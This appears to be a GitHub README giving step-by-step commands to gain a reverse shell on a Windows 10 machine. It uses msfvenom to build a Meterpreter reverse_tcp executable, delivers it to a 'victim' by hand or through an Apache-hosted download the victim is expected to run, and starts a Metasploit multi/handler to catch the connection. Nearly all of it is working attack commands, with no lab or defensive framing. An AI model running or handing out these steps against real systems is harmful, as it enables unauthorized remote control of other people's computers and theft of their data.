# Windows-10-Reverse-TCP-Shell

Step by step instructions:-

 1)sudo apt update
 
 2)sudo apt full-upgrade -y(update kali'tool)
 
 3)msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your lisner ip address> LPORT=4444 -f exe -o /home/kali/Desktop/rs_exploitl.exe(creating payloads for  windows) 
 
4)Now supply this rs_exploitl.exe to traget machine(physically/wireless)
 
 •Or, you can copy rs_exploitl.exe to /var/www/html/. Then start apache2 server by using the following command:
 
 •Service apache2 start
 
 •Service apache2 status(verified the apache2 service was running)
 
 •Now from the victim’s machine we can browse “http:// 192.168.1.103/rs_exploit.exe” and it will automatically download the file.Then “double-clicked” and ran the file
 
 5)Now start Metasploit framework by using msfconsole
 
 6)use exploit/multi/handler(configuring payload)
 
 7)set PAYLOAD windows/meterpreter/reverse_tcp > windows/meterpreter/reverse_tcp
 
 8)set LHOST < your Ip address >
 
 9)set LPORT < PORT NO. >
 
10)exploit then hit enter.
